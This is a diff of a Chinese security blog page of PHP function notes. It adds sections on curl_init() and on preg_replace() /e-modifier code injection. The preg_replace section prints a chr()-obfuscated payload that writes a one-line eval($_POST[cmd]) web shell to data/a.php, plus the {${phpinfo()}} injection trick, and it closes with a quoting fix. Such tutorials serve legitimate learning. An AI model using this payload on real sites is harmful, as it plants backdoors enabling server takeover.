@@ -54,7 +54,7 @@
 <meta property="og:site_name" content="NoObject&#39;s blog">
 <meta property="og:description" content="exif_imagetype() exif_imagetype()函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如gif的文件头GIF89a  scandir() 列出 参数目录 中的文件和目录">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2020-03-23T09:02:47.983Z">
+<meta property="og:updated_time" content="2020-03-25T10:49:22.796Z">
 <meta name="twitter:card" content="summary">
 
 <link rel="canonical" href="http://yoursite.com/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">
@@ -216,7 +216,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-03-23 17:02:47" itemprop="dateModified" datetime="2020-03-23T17:02:47+08:00">2020-03-23</time>
+                <time title="修改时间：2020-03-25 18:49:22" itemprop="dateModified" datetime="2020-03-25T18:49:22+08:00">2020-03-25</time>
               </span>
 
           
@@ -267,6 +267,32 @@
 <h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote>
 <p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p>
 </blockquote>
+<h2 id="curl-inti"><a href="#curl-inti" class="headerlink" title="curl_inti()"></a>curl_inti()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用 </span><br><span class="line">curl_setopt — 为给定的cURL会话句柄设置一个选项。</span><br><span class="line">        说明：</span><br><span class="line">          bool curl_setopt ( resource $ch , int $option , mixed $value )</span><br><span class="line">        参数:</span><br><span class="line">          ch：由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">          option：需要设置的CURLOPT_XXX选项。</span><br><span class="line">          value：将设置在option选项上的值。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span><br><span class="line">            CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span><br><span class="line">            CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            ###################</span><br><span class="line">            文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span><br><span class="line">curl_exec ：执行 cURL 会话</span><br><span class="line">curl_getinfo — 获取一个cURL连接资源句柄的信息</span><br><span class="line">                说明：</span><br><span class="line">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span><br><span class="line">                参数：</span><br><span class="line">                      ch 由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">                      opt：这个参数可能是以下常量之一:</span><br><span class="line">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span><br><span class="line">cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</span><br><span class="line">PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</span><br><span class="line">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">这些函数在PHP 4.0.2中被引入。</span><br></pre></td></tr></table></figure>
+
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p>
+<p><strong>preg_replace函数原型：</strong></p>
+<p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</p>
+<p><strong>特别说明：</strong> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 举例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace (&quot;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&quot;,</span><br><span class="line">&quot;\1.strtoupper(\2).\3&quot;,</span><br><span class="line">$html_body);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这将使输入字符串中的所有 HTML 标记变成大写。</p>
+<p>安全威胁分析： 通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。</p>
+<p>再来一个有难度的例子：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？</p>
+<p>当然有。在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</p>
+<p>在这里我们需要通过{${}}构造出了一个特殊的变量，’test(“{${phpinfo()}}”)’，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo会被成功执行了。</p>
+<p>如何防范这种漏洞呢？ 将’test(“\1”)’ 修改为”test(‘\1’)”，这样‘${phpinfo()}’就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</p>
 
     </div>
 
@@ -338,7 +364,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#exif-imagetype"><span class="nav-number">1.</span> <span class="nav-text">exif_imagetype()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scandir"><span class="nav-number">2.</span> <span class="nav-text">scandir()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#addslashes"><span class="nav-number">3.</span> <span class="nav-text">addslashes()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strcmp"><span class="nav-number">4.</span> <span class="nav-text">strcmp()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#urldecode"><span class="nav-number">5.</span> <span class="nav-text">urldecode()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ereg"><span class="nav-number">6.</span> <span class="nav-text">ereg()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strpos"><span class="nav-number">7.</span> <span class="nav-text">strpos()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#is-numeric"><span class="nav-number">8.</span> <span class="nav-text">is_numeric()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sha1"><span class="nav-number">9.</span> <span class="nav-text">sha1()</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#exif-imagetype"><span class="nav-number">1.</span> <span class="nav-text">exif_imagetype()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#scandir"><span class="nav-number">2.</span> <span class="nav-text">scandir()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#addslashes"><span class="nav-number">3.</span> <span class="nav-text">addslashes()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strcmp"><span class="nav-number">4.</span> <span class="nav-text">strcmp()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#urldecode"><span class="nav-number">5.</span> <span class="nav-text">urldecode()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ereg"><span class="nav-number">6.</span> <span class="nav-text">ereg()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#strpos"><span class="nav-number">7.</span> <span class="nav-text">strpos()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#is-numeric"><span class="nav-number">8.</span> <span class="nav-text">is_numeric()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sha1"><span class="nav-number">9.</span> <span class="nav-text">sha1()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#curl-inti"><span class="nav-number">10.</span> <span class="nav-text">curl_inti()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-replace"><span class="nav-number">11.</span> <span class="nav-text">preg_replace()</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -354,7 +380,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -405,7 +431,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共7.8k字</span>
+  <span class="post-count">博客全站共11.1k字</span>
 </div>
 <br>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
